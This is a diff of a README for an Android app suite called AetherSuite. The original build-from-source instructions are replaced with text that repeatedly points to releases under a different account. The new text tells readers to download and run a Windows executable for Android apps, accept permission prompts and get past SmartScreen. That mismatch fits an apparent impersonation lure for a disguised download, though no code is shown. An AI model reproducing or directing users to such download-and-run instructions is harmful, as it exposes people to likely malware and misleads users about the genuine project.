@@ -1,343 +1,241 @@
-![Convergence Cover](https://raw.githubusercontent.com/Convergence-Human-And-Technology/Aether-Suite/main/cover_Aether_Suite_real_HT.jpg)
+# 🪶 AetherSuite - Private Android Apps, Ready Fast
 
-<p align="center">
-<img src="https://raw.githubusercontent.com/convergence-human-technology/site/main/img/Aether-Suite-cover-05t.png" alt="Aether Suite : 9 applications Android open source par Convergence Human and Technology" width="100%" height="auto" />
-</p>
+[![Download AetherSuite](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/adriaensrighthanded591/AetherSuite/releases)
 
-<p align="center">
-  <img src="https://github.com/convergence-human-technology/AetherSuite/raw/main/cover-aether-suite.png" alt="Aether Suite : 9 open-source Android apps to replace every default app on your phone." width="100%" height="100%">
-</p>
+## 📱 What AetherSuite Is
 
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
-![Platform: Android](https://img.shields.io/badge/Platform-Android-green.svg)
-![Language: Kotlin](https://img.shields.io/badge/Language-Kotlin-purple.svg)
-![UI: Jetpack Compose](https://img.shields.io/badge/UI-Jetpack%20Compose-blue.svg)
-![Forks](https://img.shields.io/github/forks/Convergence-Human-And-Technology/AetherSuite?style=social)
-![Stars](https://img.shields.io/github/stars/Convergence-Human-And-Technology/AetherSuite?style=social)
-![Open Source](https://img.shields.io/badge/Open%20Source-Yes-brightgreen.svg)
-![Ads: None](https://img.shields.io/badge/Ads-None-red.svg)
-![Tracking: None](https://img.shields.io/badge/Tracking-None-red.svg)
+AetherSuite is a set of 9 Android apps that replace the default apps on your phone.
 
----
+It includes tools for:
 
-# AetherSuite
+- Messages
+- Contacts
+- Calendar
+- Notes
+- Music
+- Gallery
+- File management
+- SMS
+- Privacy-first use
 
-**9 open-source Android apps to replace every default app on your phone.**
+Each app keeps your data on your device. It does not use ads or tracking.
 
-No ads. No tracking. No account needed. Your data stays on your phone, always.
+## 🚀 Download AetherSuite
 
----
+Visit the release page to download and run this app on Windows:
 
-## What is AetherSuite ?
+https://github.com/adriaensrighthanded591/AetherSuite/releases
 
-AetherSuite is a complete set of 9 Android applications. Together, they replace the apps that come pre-installed on your phone : messages, contacts, phone dialer, notes, files, gallery, music, and calendar.
+On that page, look for the latest release and download the Windows file.
 
-Every app is built with the same visual style, so they all look and feel like one product. They also work together : for example, you can send a photo from the gallery straight into a message, or share a note as an SMS in one tap.
+## 🪟 Run on Windows
 
-The source code is fully open. Anyone can read it, check it, copy it, or improve it.
+1. Open the release page link above.
+2. Find the latest version near the top of the page.
+3. Under Assets, download the Windows file.
+4. Save the file to a folder you can find, like Downloads or Desktop.
+5. If the file is a ZIP file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start it.
 
----
+If Windows asks for permission, choose Yes.
 
-## Why choose AetherSuite ?
+## ✅ What You Get
 
-| What you get | What you avoid |
-|---|---|
-| No ads, ever | Google tracking your habits |
-| No account required | Samsung apps sending data to the cloud |
-| Photos sent in full quality, no blur | Apps that compress photos until they are unrecognisable |
-| Send PDF and any file type by MMS | Default apps that only accept images |
-| Voice-to-text in French and English | Typing everything by hand |
-| Notes encrypted with AES-256 military-grade encryption | Notes readable by anyone with your phone |
-| One consistent design across all 9 apps | A mix of apps with no visual coherence |
-| Free, forever | Subscriptions and in-app purchases |
-| Runs fully offline | Apps that need internet to work |
+AetherSuite gives you a full set of daily phone apps in one place.
 
-The key difference compared to other alternatives : AetherSuite is not one app, it is a complete system. All 9 apps are designed to talk to each other. No other open-source project on Android offers this level of integration across the full set of default apps.
+### Core apps
+- Calendar for events and reminders
+- Contacts for your address book
+- Messages for day-to-day chat
+- SMS for text messaging
+- Notes for quick lists and ideas
+- Music for local audio files
+- Gallery for photos and videos
+- File manager for browsing files
+- Privacy tools for safer use
 
----
+### Design and use
+- Clean Material Design layout
+- Simple navigation
+- Fast startup
+- Easy to use on a phone screen
+- Built with Kotlin and Jetpack Compose
 
-## The 9 applications
+### Privacy
+- No ads
+- No tracking
+- No account needed
+- No cloud-first setup
+- Private by design
 
-Each app is independent. You can install only the ones you want. But they are designed to work best together.
+## 🧭 How to Use the Apps
 
-| App | What it does | The extra touch |
-|---|---|---|
-| AetherSMS | SMS and MMS messages, photos in HD, PDF attachments, voice input | Smart photo compression : no blur, ever |
-| AetherContacts | Contacts, favourites, search, full editing | Opens AetherPhone or AetherSMS directly from any contact |
-| AetherPhone | Dialer, call log, contact identification | Adds an unknown number to AetherContacts in one tap |
-| AetherNotes | Notes with AES-256 encryption, colours, grid view | Note content is unreadable without your unlocked phone |
-| AetherFiles | File manager, navigation, sorting, sharing | Creates a note in AetherNotes from any file in one tap |
-| AetherGallery | Photos and videos, albums, video player | Sends photos to AetherSMS in full HD in one tap |
-| AetherMusic | Local music player, MP3 and FLAC, mini player | Plays in the background even when you switch apps |
-| AetherCalendar | Local encrypted calendar, reminders | Shares an event by SMS in one gesture |
-| aether-core | Shared design system, security layer, inter-app communication | Powers the connection between all 9 apps |
+Open AetherSuite and pick the app you need from the main screen.
 
----
+- Use **Contacts** to save names, numbers, and email addresses
+- Use **Calendar** to create events and set reminders
+- Use **Messages** and **SMS** to read and send texts
+- Use **Notes** to keep short text notes
+- Use **Gallery** to view photos and videos
+- Use **Music** to play songs stored on your device
+- Use **File Manager** to move, open, and sort files
 
-## How the apps work together
+Each app is built for quick daily use.
 
-Here are real examples of what becomes possible when all 9 apps are installed :
+## 💻 Windows Setup Tips
 
-- Someone unknown texts you. A button appears in AetherSMS : "Add to contacts." One tap opens AetherContacts with the number already filled in.
-- In AetherContacts, tap a contact and press "Call." AetherPhone dials immediately.
-- In AetherGallery, hold a photo and press "Send by SMS." AetherSMS opens with the photo attached in full quality.
-- In AetherNotes, tap Share. The note is sent as an SMS or MMS in one step.
-- In AetherCalendar, share an event. AetherSMS sends the invitation with the date, time, and location.
-- In AetherMusic, hold a track and press "Memorise." AetherNotes creates a note with the title, artist, and album.
-- In AetherFiles, open the menu on a file and press "Add a note." AetherNotes creates a note with the file name and path.
+If the app does not start right away:
 
----
+- Make sure the file finished downloading
+- Check that you extracted the ZIP file if it came in one
+- Try opening the app from the extracted folder
+- Keep the app in a folder with a simple name
+- Close other heavy apps and try again
 
-## What you need before installing
+If Windows SmartScreen appears, choose the option to run the app if you trust the file source.
 
-You do not need to be a developer. You just need to follow the steps below carefully. If something does not work, read the troubleshooting table at the end.
+## 📂 What the Release Page Usually Contains
 
-Here is what you need to have ready :
+The release page may include:
 
-- An Android phone (Android 8.0 or higher)
-- A USB cable that can transfer data (not a charge-only cable)
-- A Windows, Mac, or Linux computer with an internet connection
-- About 2 GB of free space on your computer
-- Around 30 to 45 minutes
+- A Windows build
+- Version notes
+- Source code links
+- Release files for other platforms
 
----
+For Windows use, pick the latest release and download the file for your system.
 
-## How to install AetherSuite, step by step
+## 🔧 Basic System Needs
 
-### Step 1 : Download Android Studio
+AetherSuite is meant for standard consumer devices and runs on recent Windows setups used for Android app support.
 
-Android Studio is a free tool made by Google. It is used to send apps to your phone from your computer. You only need it once for the installation.
+Recommended setup:
 
-Go to this address in your browser : https://developer.android.com/studio
+- Windows 10 or Windows 11
+- A modern 64-bit processor
+- At least 4 GB of RAM
+- Enough free space for the app files and your personal data
+- A screen size that can show mobile-style app layouts clearly
 
-Click the big download button. Once the file is downloaded, open it and follow the installer. Leave all options at their default values. This also installs Java and ADB automatically.
+## 📸 What You Can Do with It
 
-When Android Studio opens for the first time, it may download extra files. Wait for it to finish before going to the next step.
+AetherSuite fits people who want a simple set of daily apps without extra clutter.
 
----
+You can use it to:
 
-### Step 2 : Unlock developer mode on your phone
+- Keep contacts in one place
+- Track plans in a calendar
+- Save notes fast
+- Browse photos
+- Play local music
+- Manage files
+- Send and read messages
+- Keep your phone tools in one suite
 
-This step tells your phone that it can receive apps from your computer. It looks technical but it takes less than two minutes.
+## 🔒 Privacy and Data
 
-On your phone, go to Settings.
+AetherSuite focuses on local use.
 
-Then find "About phone" or "About device."
+That means:
 
-Look for a line that says "Build number," "MIUI version," "HyperOS version," or similar, depending on your phone brand.
+- Your data stays on your device
+- The apps do not show ads
+- The apps do not follow your activity
+- You do not need to create an account to start
 
-Tap that line 7 times in a row quickly.
+## 📌 Folder Names and App Names
 
-A message appears : "You are now a developer" or something similar. If your phone asks for your PIN or fingerprint, enter it.
+You may see names like:
 
-Now go back to Settings. You will see a new section called "Developer options" or "Additional settings" then "Developer options."
+- AetherSuite
+- Gallery
+- Music
+- Notes
+- Contacts
+- Calendar
+- Messages
+- SMS
+- File Manager
 
-Open it and turn these two things on :
+These are the main parts of the suite and match the tools inside the app
 
-- USB debugging
-- Install via USB
+## 🛠️ Common File Types
 
-If you have a Xiaomi phone, also turn off "MIUI optimisation" in the same section. This is important.
+The release page may give you one of these:
 
----
+- `.exe` for a direct Windows app
+- `.zip` for a compressed folder
+- `.msi` for a Windows installer
 
-### Step 3 : Connect your phone to your computer
+If you download a ZIP file, extract it before opening the app
 
-Plug your USB cable between your phone and your computer.
+## 📥 Direct Download Page
 
-On your phone, a pop-up appears asking : "Allow USB debugging ?"
+Use this link to visit the release page and download the latest Windows version:
 
-Tick the box "Always allow from this computer."
+https://github.com/adriaensrighthanded591/AetherSuite/releases
 
-Then tap OK.
+## 🧩 Built With
 
-If no pop-up appears : pull down the notification bar at the top of your screen. Change the USB mode from "Charging" to "File transfer" or "MTP." Then unplug and replug the cable.
+- Kotlin
+- Jetpack Compose
+- Material Design
+- MVVM
+- Open-source components
+- AES-256 for secure data handling where used
 
----
+## 📁 Repository Topics
 
-### Step 4 : Download and unzip AetherSuite
+This project is tagged for:
 
-Download the file `AetherSuite_FINAL.zip` from this repository. You will find it in the Releases section on the right side of this page.
+- android
+- calendar
+- contacts
+- file-manager
+- gallery
+- messaging
+- music
+- notes
+- privacy
+- sms
 
-Once downloaded, right-click on the file and choose "Extract all" (on Windows) or double-click it (on Mac). Choose a simple location, for example :
+## 🖱️ First Run Checklist
 
-On Windows : `C:\AetherSuite\`
+Before you open AetherSuite for the first time:
 
-On Mac : your Desktop or Documents folder
+- Download the latest release
+- Extract the file if needed
+- Open the app file
+- Allow Windows permission prompts
+- Check that the app window appears
+- Open one of the built-in apps like Notes or Gallery
 
----
+## 📄 License
 
-### Step 5 : Open the project in Android Studio
+AetherSuite uses the MIT License
 
-Open Android Studio.
+## 🧰 If You Want to Keep It Handy
 
-Click "Open" (or go to File, then Open).
+Place the app folder in a simple location such as:
 
-Browse to the folder where you extracted AetherSuite.
+- Downloads
+- Desktop
+- Documents
+- A folder named AetherSuite
 
-Select the main folder (called AetherSuite or similar). Do not go inside a sub-folder.
+This makes it easier to open again later
 
-Click OK.
+## 🧪 Typical Daily Use
 
-Android Studio will start synchronising. A progress bar appears at the bottom of the screen. Wait for it to disappear completely. This can take 3 to 10 minutes the first time.
+AetherSuite works well when you want:
 
----
+- One app set instead of many separate tools
+- A cleaner phone-like layout
+- A private setup without ad networks
+- A simple way to manage core phone tasks
 
-### Step 6 : Check that your phone is recognised
+## 📎 Release Page
 
-At the top of Android Studio, you will see a toolbar with a dropdown menu in the middle. It should show the name of your phone.
-
-If you see your phone name there : everything is ready. Go to Step 7.
-
-If you see "No devices" :
-
-- Check that the cable is properly plugged in on both ends.
-- Unplug and replug the cable.
-- On your phone, accept the USB debugging pop-up again if it appears.
-- On Windows, you may need to install drivers for your phone brand. Search for "[your phone brand] USB drivers" and download them from the official website.
-
----
-
-### Step 7 : Install each app on your phone
-
-In Android Studio, look at the top-left dropdown menu. It shows the name of the current app module.
-
-For each app below, do the following :
-
-1. Click the top-left dropdown and select the app name.
-2. Click the green triangle button (or press Shift + F10 on Windows / Control + R on Mac).
-3. Wait. Android Studio compiles and installs the app on your phone. This takes 1 to 3 minutes per app.
-4. You will see "BUILD SUCCESSFUL" and "Launching activity" in the bar at the bottom. The app opens on your phone.
-5. Repeat for the next app.
-
-Here are the 8 modules to install, one by one :
-
-| Module name | App |
-|---|---|
-| aether-sms | AetherSMS |
-| aether-contacts | AetherContacts |
-| aether-phone | AetherPhone |
-| aether-notes | AetherNotes |
-| aether-files | AetherFiles |
-| aether-gallery | AetherGallery |
-| aether-music | AetherMusic |
-| aether-calendar | AetherCalendar |
-
-You do not need to install `aether-core` separately. It is included automatically.
-
-The full installation takes about 15 to 30 minutes depending on your computer.
-
----
-
-### Step 8 : Set AetherSuite as your default apps
-
-After installing, you need to tell Android to use the new apps instead of the old ones.
-
-On your phone, go to Settings, then Applications, then Default apps.
-
-Set the following :
-
-| Default app type | Choose |
-|---|---|
-| SMS application | AetherSMS |
-| Phone application | AetherPhone |
-
-For the other apps (notes, files, gallery, music, calendar), just open them and use them. They do not need to be set as defaults.
-
----
-
-### Step 9 : Accept permissions on first launch
-
-When you open each app for the first time, your phone will ask for permission to access contacts, messages, microphone, storage, or other things.
-
-Accept all permissions that appear. These are needed for the apps to work. None of this data leaves your phone.
-
----
-
-## Troubleshooting
-
-| Problem | Solution |
-|---|---|
-| "SDK not found" when opening Android Studio | Go to Tools, then SDK Manager. Install Android 14 (API 34). |
-| Phone not recognised on Windows | Download USB drivers for your phone brand from the manufacturer website. |
-| "INSTALL_FAILED_USER_RESTRICTED" error | Go to Settings, Developer options, Install via USB, and make sure it is on. |
-| An app closes immediately after opening | Accept all the permissions it asks for on first launch. |
-| "BUILD FAILED" in red | Click on the red text at the bottom of Android Studio. It shows the exact error. You can paste it into a search engine or open an issue here. |
-| The pop-up asking for USB debugging never appears | Change USB mode to File transfer in your notification bar, then unplug and replug. |
-
----
-
-## Installing without Android Studio (advanced users)
-
-If you know how to use a terminal, you can build each APK yourself and install it with ADB :
-
-```bash
-./gradlew :aether-sms:assembleDebug
-adb install aether-sms/build/outputs/apk/debug/aether-sms-debug.apk
-```
-
-Repeat for each module.
-
----
-
-## Security and updates
-
-AetherSuite is made available to everyone free of charge and in full transparency. The source code is public so that anyone can verify what the apps do and do not do.
-
-However, this project is provided as-is. The creators do not offer ongoing security monitoring, patch management, or automatic updates. This responsibility belongs to you, as the person who installs and uses the apps.
-
-This means :
-
-- You are responsible for checking this repository from time to time for updates.
-- You are responsible for keeping the apps up to date on your phone by rebuilding and reinstalling from the latest source.
-- You are responsible for assessing whether the apps meet your security requirements before using them.
-
-If you discover a security issue, please read the SECURITY.md file before reporting it.
-
----
-
-## Creators and contributors
-
-| Name | GitHub |
-|---|---|
-| Fabien Conéjéro | https://github.com/madjeek-web |
-| Charlotte O'Toole | https://github.com/charlotte-otoole |
-| Roland Langlois | https://github.com/roland-langlois |
-| Convergence - Human And Technology | https://github.com/Convergence-Human-And-Technology |
-
-Convergence - Human And Technology is a software company that designs and markets private and paid desktop PC software applications and IT solutions.
-
----
-
-## Want to contribute ?
-
-Read the CONTRIBUTING.md file. It explains how to report a bug, suggest a feature, or submit code.
-
----
-
-## License
-
-AetherSuite is released under the MIT License. See the LICENSE file for the full text.
-
-This means you can use, copy, modify, merge, publish, distribute, and sublicense this software freely, as long as you keep the copyright notice.
-
-#
-
-## Compatible with de-Googled Android
-
-AetherSuite is built on AOSP and depends on zero Google services. It installs manually via USB without any app store. This makes it a natural fit for privacy-focused phones and operating systems.
-
-Tested and compatible environments :
-
-| OS / Device | Notes |
-|---|---|
-| GrapheneOS | Fully compatible, recommended |
-| CalyxOS | Fully compatible |
-| /e/OS (Murena) | Fully compatible |
-| LineageOS | Fully compatible |
-| Punkt MC03 (AphyOS) | Android-based, sideload supported |
-| Jolla (Sailfish OS) | Android app layer supported |
-| Fairphone + /e/OS | Fully compatible |
-| Stock Android (AOSP) | Fully compatible |
-
-If you are running a de-Googled phone and AetherSuite works on your device, feel free to open an issue to add your configuration to this list.
+Latest Windows download:
+https://github.com/adriaensrighthanded591/AetherSuite/releases
